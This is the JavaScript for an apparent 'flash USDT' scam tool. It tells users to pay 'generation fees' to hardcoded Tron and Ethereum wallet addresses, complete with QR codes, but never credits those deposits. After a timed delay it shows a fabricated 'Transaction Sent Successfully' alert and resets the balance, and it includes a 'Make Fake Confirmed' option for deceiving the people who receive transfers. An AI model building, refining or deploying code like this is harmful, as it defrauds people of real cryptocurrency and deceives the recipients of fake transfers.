// Wait until the DOM is fully loaded before running the script
document.addEventListener('DOMContentLoaded', () => {
    console.log("DOM fully loaded. Initializing Tool script.");

    // --- Elements ---
    const overlay = document.getElementById('universalModalOverlay');
    const modalContent = document.getElementById('universalModalContent');
    const addTronBtn = document.getElementById('addTronFeeBtn');
    const addEthBtn = document.getElementById('addEthFeeBtn');
    const flashButton = document.getElementById('flashButton');
    const receiversAddressInput = document.getElementById('receiversAddress');
    const networkSelect = document.getElementById('network');
    const amountInput = document.getElementById('amount');
    const processingSection = document.getElementById('processingSection');
    const tronBalanceDisplay = document.getElementById('tron-balance-display');
    const ethBalanceDisplay = document.getElementById('eth-balance-display');
    const depositStatusElement = document.getElementById('deposit-status');
    const authLinksDiv = document.getElementById('auth-links');
    const userSessionDiv = document.getElementById('user-session');
    const usernameDisplaySpan = document.getElementById('username-display');
    const logoutButton = document.getElementById('logout-button');
    const customizeFeeCheckbox = document.getElementById('customizeFee');
    const feeRateInput = document.getElementById('feeRate');
    const setDelayCheckbox = document.getElementById('setDelay');
    const minDelayInput = document.getElementById('minDelay');
    const dayDelayInput = document.getElementById('dayDelay');
    const splitCheckbox = document.getElementById('splitOption');
    const tradeCheckbox = document.getElementById('tradeOption');
    const swapCheckbox = document.getElementById('swapOption');
    const btcBalanceSpan = document.getElementById('btcBalance');
    const systemDateSpan = document.getElementById('systemDate');
    const osInfoSpan = document.getElementById('osInfo');
    const platformInfoSpan = document.getElementById('platformInfo');
    const refreshButton = document.getElementById('refreshButton');
    const cancelButton = document.getElementById('cancelButton');
    const confirmFakeCheckbox = document.getElementById('confirmFakeCheckbox');

    console.log("Checking essential elements...");
    const essentialElements = {
        overlay, modalContent, addTronBtn, addEthBtn, flashButton, receiversAddressInput,
        networkSelect, amountInput, processingSection, tronBalanceDisplay,
        ethBalanceDisplay, depositStatusElement,
        authLinksDiv, userSessionDiv, usernameDisplaySpan, logoutButton,
        systemDateSpan, osInfoSpan, platformInfoSpan, refreshButton, cancelButton
    };
    let allElementsFound = true;
    for (const key in essentialElements) {
        if (!essentialElements[key]) {
            console.error(`Initialization Error: Element '${key}' not found.`);
            allElementsFound = false;
        }
    }
    if (!allElementsFound) {
         alert(`Initialization Error: One or more critical page elements are missing. The tool cannot start.`);
         return;
    }
     console.log("All essential elements found.");

    // --- State & Configuration ---
    let currentTronBalance = 0.00; // Fee balance will stay 0 unless manually changed here
    let currentEthBalance = 0.00; // Fee balance will stay 0 unless manually changed here
    let isVerifyingDeposit = false; // Used to manage modal flow state ONLY
    let pendingDepositNetwork = null;
    let pendingDepositAmountUSD = 0; // Still tracked for display purposes
    let maxFlashAmount = 0;

    const WALLET_MAX_FLASH = 100000000;
    const MIN_FLASH_AMOUNT = 1000;
    const FEE_PER_UNIT_FLASH = 50;
    const FLASH_UNIT_AMOUNT = 1000;
    const TRX_PER_USD = 4.10;
    const ETH_PER_USD = 0.00044;
    const MIN_DEPOSIT_USD = 50; // Min amount to *show* in modal
    const MAX_DEPOSIT_USD = 5000; // Max amount to *show* in modal
    const TRON_DEPOSIT_ADDRESS = "TPowMg7Jd3DpwDggkoSzxuTU8pGTksdua8";
    const ETHEREUM_DEPOSIT_ADDRESS = "0x374756d81ccc0f8cad4e0863bb96ad5e1579f9cc";

    const NETWORK_DETAILS = {
        tron: { key: "tron", name: "Tron (TRC20)", ticker: "TRX", address: TRON_DEPOSIT_ADDRESS, iconClass: "tron-icon", rate: TRX_PER_USD, qrPrefix: "tron:", minFee: 0.5, cryptoPrecision: 6 },
        ethereum: { key: "ethereum", name: "Ethereum (ERC20)", ticker: "ETH", address: ETHEREUM_DEPOSIT_ADDRESS, iconClass: "eth-icon", rate: ETH_PER_USD, qrPrefix: "ethereum:", minFee: 5.0, cryptoPrecision: 8 }
    };

    // --- UI Update Function based on Login State ---
    function updateLoginStateUI() {
        const loggedInUsername = localStorage.getItem('loggedInUser');
        if (loggedInUsername) {
            if (usernameDisplaySpan) usernameDisplaySpan.textContent = loggedInUsername;
            if (userSessionDiv) userSessionDiv.style.display = 'block';
            if (authLinksDiv) authLinksDiv.style.display = 'none';
            console.log(`User '${loggedInUsername}' is logged in.`);
        } else {
            if (usernameDisplaySpan) usernameDisplaySpan.textContent = '';
            if (userSessionDiv) userSessionDiv.style.display = 'none';
            if (authLinksDiv) authLinksDiv.style.display = 'block';
            console.log("User is logged out.");
        }
        checkFlashButtonEligibility();
    }

    // --- Utility Functions ---
    function showModal(content) { if (!modalContent || !overlay) return; modalContent.innerHTML = content; overlay.style.display = 'flex'; void overlay.offsetWidth; overlay.classList.add('show'); console.log("Modal shown."); }

    // MODIFIED hideModal to reset deposit state
    function hideModal() {
        if (!modalContent || !overlay) return;
        overlay.classList.remove('show');
        const t = 300;
        setTimeout(() => {
            if (!overlay.classList.contains('show')) {
                overlay.style.display = 'none';
                modalContent.innerHTML = '';

                // Reset deposit process state when modal closes
                if (isVerifyingDeposit) {
                    console.log("Resetting deposit state on modal hide.");
                    isVerifyingDeposit = false; // Allow new deposit attempts
                    if(addTronBtn) addTronBtn.disabled = false;
                    if(addEthBtn) addEthBtn.disabled = false;
                    if(depositStatusElement) depositStatusElement.classList.remove('show');
                    checkFlashButtonEligibility(); // Re-check flash button status
                    pendingDepositAmountUSD = 0;
                    pendingDepositNetwork = null;
                }
            }
        }, t);
        console.log("Modal hidden.");
    }

    async function copyToClipboard(text) { try { if (!navigator.clipboard) { console.warn("Using fallback clipboard."); const ta = document.createElement("textarea"); ta.value = text; ta.style.position="fixed"; ta.style.top="-9999px"; ta.style.left="-9999px"; document.body.appendChild(ta); ta.focus(); ta.select(); let s=false; try{s=document.execCommand('copy');}catch(e){console.error('Fallback copy failed:',e);throw e;}finally{document.body.removeChild(ta);} if(s){ console.log("Copied (fallback)."); return; }else{ throw new Error('Fallback failed.'); }} else { await navigator.clipboard.writeText(text); console.log("Copied (async)."); }} catch(e){ console.error('Copy failed: ',e); alert('Could not copy. Please copy manually.'); throw e; }}
    function formatNumber(num, digits = 0) { const n = Number(num); return isNaN(n) ? 'N/A' : n.toLocaleString('en-US', { maximumFractionDigits: digits }); }

    function updateBalanceDisplay() {
        if (tronBalanceDisplay) tronBalanceDisplay.textContent = `$${currentTronBalance.toFixed(2)}`;
        if (ethBalanceDisplay) ethBalanceDisplay.textContent = `$${currentEthBalance.toFixed(2)}`;
        maxFlashAmount = calculateMaxFlashAmount();
        checkFlashButtonEligibility(); // Trigger eligibility check after update
    }

    function calculateMaxFlashAmount() { if (!networkSelect) return 0; const k = networkSelect.value === "TRC20" ? "tron" : "ethereum"; const c = NETWORK_DETAILS[k]; if (!c) return 0; const b = k === "tron" ? currentTronBalance : currentEthBalance; const f = c.minFee || 0; if (b < f) return 0; if (b < MIN_DEPOSIT_USD) return 0; const bl = Math.floor(b / FEE_PER_UNIT_FLASH); const a = bl * FLASH_UNIT_AMOUNT; return Math.min(a, WALLET_MAX_FLASH); }

    // MODIFIED: Only sets title, doesn't visually disable flashButton based on fees
    function checkFlashButtonEligibility() {
        if (!flashButton) return;

        // Block visually ONLY if deposit modal/process is active
        if (isVerifyingDeposit) {
             flashButton.title = "Cannot create transaction while the fee deposit process is active. Close the modal first.";
             flashButton.classList.add('opacity-50', 'cursor-not-allowed');
             console.log("checkFlashButtonEligibility: Blocked - Deposit process active.");
             return; // Exit early
        }

        // --- Calculate reason for tooltip/title, but don't change visual style based on fees ---
        const networkKey = networkSelect.value === "TRC20" ? "tron" : "ethereum";
        const networkConfig = NETWORK_DETAILS[networkKey];
        const balance = networkKey === "tron" ? currentTronBalance : currentEthBalance;
        const currentMaxFlashCalculated = calculateMaxFlashAmount();
        let reason = 'Create Transaction'; // Default title

        if (balance < (networkConfig.minFee || 0)) {
            // Update title ONLY for hover information, reflecting the English message shown on click
            reason = `Insufficient generation fee balance (Need $${(networkConfig.minFee || 0).toFixed(2)}, Have $${balance.toFixed(2)})`;
        } else if (currentMaxFlashCalculated < MIN_FLASH_AMOUNT) {
            if (balance < MIN_DEPOSIT_USD) {
                reason = `Minimum $${MIN_DEPOSIT_USD.toFixed(2)} fee deposit required. Balance: $${balance.toFixed(2)}.`;
            } else {
                reason = `Fee balance ($${balance.toFixed(2)}) allows max ${formatNumber(currentMaxFlashCalculated, 0)} USDT flash, below minimum ${formatNumber(MIN_FLASH_AMOUNT, 0)}. Deposit more fees .`;
            }
        } // If fees are sufficient and min flash amount is met, reason remains 'Create Transaction'

        // Set the button title regardless of fee status
        flashButton.title = reason;

        // --- Ensure the button ALWAYS LOOKS enabled (remove disabling classes) ---
        flashButton.classList.remove('opacity-50', 'cursor-not-allowed');

        console.log("checkFlashButtonEligibility called. isVerifyingDeposit:", isVerifyingDeposit, "Title:", flashButton.title);
    }


    function generateQrCode(data, id) { const cont = document.getElementById(id); if (!cont) { console.error('QR Container not found:', id); return; } cont.innerHTML = ''; try { if (typeof QRCodeStyling === 'undefined') { console.error("QR Code Styling library not loaded."); cont.textContent = "Error: QR library failed."; cont.style.color = 'var(--error-color)'; return; } console.log("Generating QR code with data:", data); const qrCode = new QRCodeStyling({ width: 120, height: 120, type: 'svg', data: data, dotsOptions: { color: "#000000", type: "dots" }, backgroundOptions: { color: "#ffffff" }, cornersSquareOptions: { type: "square", color: "#000000" }, cornersDotOptions: { type: "square", color: "#000000" }, qrOptions: { errorCorrectionLevel: 'M' }, imageOptions: { hideBackgroundDots: true, imageSize: 0.4, margin: 4 } }); qrCode.append(cont); console.log("QR code generated successfully."); } catch (e) { console.error("QR code generation error:", e); cont.textContent = "Failed to generate QR."; cont.style.color = 'var(--error-color)'; } }
    // Translated modal confirmation text
    function createConfirmationHtml(nk) { const d = NETWORK_DETAILS[nk]; if (!d) return '<p style="color:var(--error-color)" class="p-4">Error: Unknown Network Key.</p>'; const pt = `Min $${MIN_DEPOSIT_USD.toFixed(2)} - Max $${MAX_DEPOSIT_USD.toFixed(2)}`; return `<div class="modal-header"><span>Deposit ${d.ticker} Fee (Show Info)</span></div><div class="modal-body"><p class="mb-4">Enter amount in USD ($) to view  info for ${d.name} fees. Min amount is $${MIN_DEPOSIT_USD.toFixed(2)}.</p><label for="depositUsdAmountInput">Amount in USD</label><input type="number" id="depositUsdAmountInput" name="usd_amount" min="${MIN_DEPOSIT_USD}" max="${MAX_DEPOSIT_USD}" placeholder="${pt}" step="0.01" required><p id="modal-error-message" class="modal-error"></p></div><div class="modal-actions"><button class="modal-button proceed-btn" data-action="proceedDeposit" data-network="${nk}">Show Deposit Info</button><button class="modal-button close-modal-btn" data-action="close">Cancel</button></div>`; }

    // Translated deposit screen text
    function createDepositScreenHtml(nk, ua, ca, da) {
        const d = NETWORK_DETAILS[nk];
        if (!d) return '<p style="color:var(--error-color)" class="p-4">Error: Network data missing.</p>';
        const nn = d.name; const t = d.ticker; const us = `$${ua.toFixed(2)}`;
        const cf = ca.toFixed(d.cryptoPrecision); const qd = `${d.qrPrefix}${da}?amount=${cf}`;
        console.log("QR Data for deposit:", qd);
        return `<div class="deposit-screen-content">
                    <h2 class="text-xl font-semibold mb-4">Deposit ${t} for Fees</h2>
                    <p class="mb-4">To simulate adding ${us} to your ${nn} fee balance, you would send the exact crypto amount below:</p>
                    <div class="deposit-info-line"><span class="label">Amount:</span><span class="value crypto-amount">${cf} ${t}</span></div>
                    <div class="deposit-info-line items-start"><span class="label">To Address (${nn}):</span><div class="flex-grow break-all mr-2"><span class="value text-sm" id="deposit-address-text">${da}</span></div><button class="copy-button" data-clipboard-text="${da}" title="Copy Address">Copy</button></div>
                    <div class="qr-section">
                        <p class="text-sm mb-2">Scan QR Code (check amount):</p>
                        <div class="qr-code-container" id="qr-code-container"><p class="text-gray-500 text-xs py-4">Generating QR...</p></div>
                        <p class="text-xs mt-2 text-gray-500">Send only ${t} (${nn}). Other assets may be lost.</p>
                    </div>
                    <div class="deposit-note">
                        <i class="fas fa-info-circle mr-2"></i><strong>:</strong> Sending funds to this address . This tool will <strong>NOT</strong> automatically detect or update your fee balance. You can close this window.
                    </div>
                </div>
                <div class="modal-actions mt-5"><button class="modal-button close-modal-btn" data-action="closeDepositWindow">Close Window</button></div>`;
    }

    // --- Event Listeners Setup ---
    function handleAddFeeClick(e) {
        const b = e.target.closest('button.add-button-small');
        if (!b || b.disabled) return;
        // Translated alert
        if (isVerifyingDeposit) {
            console.warn("Add fee blocked: Another deposit process is active.");
            alert(`Cannot start a new deposit  while the previous one is active. Please close the current deposit window first.`);
            return;
        }
        const nk = b.dataset.network;
        if (!NETWORK_DETAILS[nk]) { console.error("Invalid network key:", nk); alert("Internal error: Invalid network."); return; }
        console.log(`Show deposit info clicked for: ${nk}`);
        showModal(createConfirmationHtml(nk));
    }
    if (addTronBtn) addTronBtn.addEventListener('click', handleAddFeeClick);
    if (addEthBtn) addEthBtn.addEventListener('click', handleAddFeeClick);

    if (modalContent) {
        modalContent.addEventListener('click', (e) => {
            const tb = e.target.closest('button[data-action], button[data-clipboard-text]');
            if (!tb) return;
            const act = tb.dataset.action;
            const ct = tb.dataset.clipboardText;

            if (act === 'close' || act === 'closeDepositWindow') { // Treat both as closing the modal
                hideModal();
            } else if (act === 'proceedDeposit') {
                console.log("Proceed Deposit clicked (Show Info Only).");
                const ai = document.getElementById('depositUsdAmountInput');
                const er = document.getElementById('modal-error-message');
                const pb = tb;
                const nk = pb.dataset.network;

                if (!ai || !er || !pb || !nk || !NETWORK_DETAILS[nk]) { console.error("Deposit modal elements missing/invalid."); alert("Error preparing deposit."); hideModal(); return; }
                const ua = parseFloat(ai.value);
                er.textContent = ''; er.classList.remove('show');
                // Translated validation message
                if (isNaN(ua) || ua < MIN_DEPOSIT_USD || ua > MAX_DEPOSIT_USD) { er.textContent = `Amount must be between $${MIN_DEPOSIT_USD.toFixed(2)} and $${MAX_DEPOSIT_USD.toFixed(2)}.`; er.classList.add('show'); if(ai.style) ai.style.borderColor = 'var(--error-color)'; ai.focus(); console.warn("Deposit validation failed:", ai.value); return; }

                if(ai.style) ai.style.borderColor = '';
                pb.disabled = true; pb.textContent = 'Loading...';

                const d = NETWORK_DETAILS[nk];
                const ca = ua * d.rate;
                const da = d.address;

                // --- Start Deposit State ---
                pendingDepositAmountUSD = ua; // Track requested amount for display
                pendingDepositNetwork = nk;
                isVerifyingDeposit = true; // Block other actions while modal is open
                if(addTronBtn) addTronBtn.disabled = true;
                if(addEthBtn) addEthBtn.disabled = true;

                // Update status message - Translated
                if(depositStatusElement) {
                    depositStatusElement.textContent = `Showing deposit info for $${ua.toFixed(2)} on ${d.name}. Balance will NOT update automatically.`;
                    depositStatusElement.classList.add('show');
                }

                checkFlashButtonEligibility(); // Update flash button state (will be disabled visually due to isVerifyingDeposit)

                // Show deposit details modal
                modalContent.innerHTML = createDepositScreenHtml(nk, ua, ca, da);
                requestAnimationFrame(() => {
                    const qc = 'qr-code-container';
                    const q = document.getElementById(qc);
                    if (q) { const qd = `${d.qrPrefix}${da}?amount=${ca.toFixed(d.cryptoPrecision)}`; generateQrCode(qd, qc); }
                    else { console.error(`QR container #${qc} not found.`); }
                });
                console.log(`Deposit info screen shown for ${nk}. NO automatic balance update will occur.`);

                // --- NO BALANCE UPDATE LOGIC ---

            } else if (ct) {
                console.log(`Copy clicked: ${ct}`);
                copyToClipboard(ct).then(() => { const buttonTextElement = tb.querySelector('.copy-button-text') || tb; const originalText = buttonTextElement.textContent; buttonTextElement.textContent = 'Copied'; setTimeout(() => { buttonTextElement.textContent = originalText; }, 1500); }).catch(err => { console.error("Copy failed:", err); });
            }
        });
    }

    if (overlay) { overlay.addEventListener('click', (e) => { if (e.target === overlay) { hideModal(); } }); }
    if (networkSelect) { networkSelect.addEventListener('change', () => { updateBalanceDisplay(); }); }
    // Translated logout alert
    if (logoutButton) { logoutButton.addEventListener('click', (e) => { e.preventDefault(); try { localStorage.removeItem('loggedInUser'); updateLoginStateUI(); alert("You have been logged out."); } catch (er) { console.error("Logout error:", er); alert("Logout error."); } }); }
    if (refreshButton) { refreshButton.addEventListener('click', () => { location.reload(); }); }
    // Translated cancel alert
    if (cancelButton) { cancelButton.addEventListener('click', () => { if(receiversAddressInput) receiversAddressInput.value = ''; if(amountInput) amountInput.value = ''; alert("Receiver and Amount fields cleared."); }); }

    // --- Flash Button (Create Transaction) Click Listener ---
    // MODIFIED: Shows specific English alert first if fees are insufficient
    if (flashButton) {
        flashButton.addEventListener('click', () => {
            console.log("Create Transaction button clicked.");

            // 1. Check if deposit modal is active - Translated alert
            if (isVerifyingDeposit) {
                alert("❌ Cannot Create Transaction.\n\nThe fee deposit  window is active. Please close it first.");
                console.warn("Flash blocked: Deposit process active.");
                return;
            }

            // 2. *** PRIMARY CHECK: Minimum Network Fee ***
            const currentNetworkKey = networkSelect.value === "TRC20" ? "tron" : "ethereum";
            const currentNetworkConfig = NETWORK_DETAILS[currentNetworkKey];
            const currentBalance = currentNetworkKey === "tron" ? currentTronBalance : currentEthBalance;
            const minimumFee = currentNetworkConfig.minFee || 0;

            if (currentBalance < minimumFee) {
                // *** Show the REQUIRED English alert ***
                alert("Insufficient generation fee balance. Please add fees."); // English message
                console.warn(`Transaction blocked: Insufficient minimum fee for ${currentNetworkKey}. Needed: $${minimumFee.toFixed(2)}, Have: $${currentBalance.toFixed(2)}`);
                return; // Stop execution immediately
            }

            // --- If minimum fee check passes, proceed with other validations ---
            console.log("Minimum fee check passed. Proceeding with other validations...");

            // 3. Validate Address and Amount fields - Translated alert
            const receiverAddress = receiversAddressInput.value.trim();
            const amountStr = amountInput.value.trim();
            const amount = parseFloat(amountStr);

            if (!receiverAddress || !amountStr || isNaN(amount) || amount <= 0) {
                alert("⚠️ Please enter a valid Receiver's Address and Amount.");
                console.warn("Validation failed: Missing address or amount.");
                if (!receiverAddress) receiversAddressInput.focus();
                else if (!amountStr || isNaN(amount) || amount <= 0) amountInput.focus();
                return;
            }

            // 4. Check against calculated max flash
            const currentMaxFlashCalculated = calculateMaxFlashAmount();
            let feeError = null;
            if (currentMaxFlashCalculated < MIN_FLASH_AMOUNT) {
                feeError = `Fee balance ($${currentBalance.toFixed(2)}) allows max ${formatNumber(currentMaxFlashCalculated, 0)} USDT flash, below minimum ${formatNumber(MIN_FLASH_AMOUNT, 0)}..`;
            } else if (amount > currentMaxFlashCalculated) {
                feeError = `Requested amount (${formatNumber(amount, 0)} USDT) exceeds max allowed (${formatNumber(currentMaxFlashCalculated, 0)} USDT) based on current fee balance.`;
            }

            // Translated alert
            if (feeError) {
                alert(`⚠️ Cannot create transaction.\n\nReason: ${feeError}\n\nPlease deposit sufficient fees  or adjust the amount.`);
                console.warn("Transaction blocked by insufficient fees vs amount:", feeError);
                return;
            }

            // 5. Final address format / amount range validations - Translated alert
            let validationErrors = [];
            let addressValid = false;
            if (currentNetworkKey === "tron" && receiverAddress.startsWith('T') && receiverAddress.length === 34) addressValid = true;
            else if (currentNetworkKey === "ethereum" && receiverAddress.match(/^0x[a-fA-F0-9]{40}$/)) addressValid = true;
            if (!addressValid) validationErrors.push(`Invalid or unsupported ${currentNetworkConfig.name} receiver address format.`);
            if (amount < MIN_FLASH_AMOUNT) { validationErrors.push(`Minimum amount is ${formatNumber(MIN_FLASH_AMOUNT, 0)} USDT.`); }
            if (amount > WALLET_MAX_FLASH) { validationErrors.push(`Amount exceeds the overall tool limit (${formatNumber(WALLET_MAX_FLASH, 0)} USDT).`); }

            if (validationErrors.length > 0) {
                alert("⚠️ Please fix the following issues:\n\n- " + validationErrors.join("\n- "));
                console.warn("Validation failed:", validationErrors);
                return;
            }

            // --- If all checks pass (including the initial minimum fee check) ---
            console.log("--- Additional Options State ---");
            console.log("Customize Fee:", customizeFeeCheckbox.checked, "Rate:", feeRateInput.value);
            console.log("Set Delay:", setDelayCheckbox.checked, "Min:", minDelayInput.value, "Day:", dayDelayInput.value);
            const selectedProxy = document.querySelector('input[name="proxyOption"]:checked'); console.log("Proxy:", selectedProxy ? selectedProxy.value : 'none selected');
            const selectedTransfer = document.querySelector('input[name="transferOption"]:checked'); console.log("Transferable:", selectedTransfer ? selectedTransfer.value : 'none selected');
            console.log("Split:", splitCheckbox.checked);
            console.log("Trade:", tradeCheckbox.checked);
            console.log("Swap:", swapCheckbox.checked);
            console.log("Make Fake Confirmed:", confirmFakeCheckbox.checked);
            console.log("-----------------------------");
            console.log(`Validation passed. Initiating transaction.`);
            if(processingSection) processingSection.style.display = 'flex';
            flashButton.classList.add('opacity-50', 'cursor-not-allowed'); // Visually disable during processing
            flashButton.textContent = 'PROCESSING...';
            if(receiversAddressInput) receiversAddressInput.disabled = true; if(amountInput) amountInput.disabled = true; if(networkSelect) networkSelect.disabled = true;

            // Simulate processing time
            setTimeout(() => {
                if(processingSection) processingSection.style.display = 'none';
                flashButton.textContent = 'Create Transaction';
                // Check eligibility will re-enable visual state if needed
                if(receiversAddressInput) receiversAddressInput.disabled = false; if(amountInput) amountInput.disabled = false; if(networkSelect) networkSelect.disabled = false;
                // Translated success alert
                alert(`✅ Transaction Sent Successfully!\n\nAmount: ${formatNumber(amount, 0)} USDT\nNetwork: ${currentNetworkKey}\nReceiver: ${receiverAddress}`);
                console.log(`Consuming fee balance  for ${currentNetworkKey}.`);
                // IMPORTANT: Balance is reset even though it wasn't increased automatically.
                if (currentNetworkKey === 'tron') {
                    currentTronBalance = 0.00;
                } else if (currentNetworkKey === 'ethereum') {
                    currentEthBalance = 0.00;
                }
                console.log("Fee balance reset to $0.00 for the used network.");
                updateBalanceDisplay(); // Update display and check eligibility
                console.log("Transaction complete. Resetting receiver/amount fields.");
                if(receiversAddressInput) receiversAddressInput.value = ''; if(amountInput) amountInput.value = '';
            }, 2500); // 2.5 second
        });
    }

    // --- Initial Setup Calls ---
    function initializeTool() {
        console.log("Running initial page setup...");
        if(systemDateSpan) systemDateSpan.textContent = new Date().toLocaleDateString();
        let os = "N/A";
        try { // Best effort OS detection
            if (navigator.userAgentData && navigator.userAgentData.platform) { os = navigator.userAgentData.platform; }
            else if (navigator.platform) { os = navigator.platform; }
            else if (navigator.oscpu) { os = navigator.oscpu; }
        } catch (e) { console.warn("Could not access userAgentData or platform details.", e); }
        if (os === "N/A") { const ua = navigator.userAgent; if (ua.indexOf("Win") != -1) os = "Windows"; else if (ua.indexOf("Mac") != -1) os = "MacOS"; else if (ua.indexOf("Linux") != -1) os = "Linux"; else if (ua.indexOf("Android") != -1) os = "Android"; else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) os = "iOS"; }
        if(osInfoSpan) osInfoSpan.textContent = os;
        if(platformInfoSpan) platformInfoSpan.textContent = navigator.platform || "N/A";
        updateBalanceDisplay(); // Initial balance display and eligibility check
        if (networkSelect) { networkSelect.dispatchEvent(new Event('change')); } // Trigger change to potentially update max flash
        updateLoginStateUI(); // Check login status
        console.log("Initial setup complete. Tool ready.");
    }
    initializeTool();

});
console.log("Tool Script parsed successfully.");
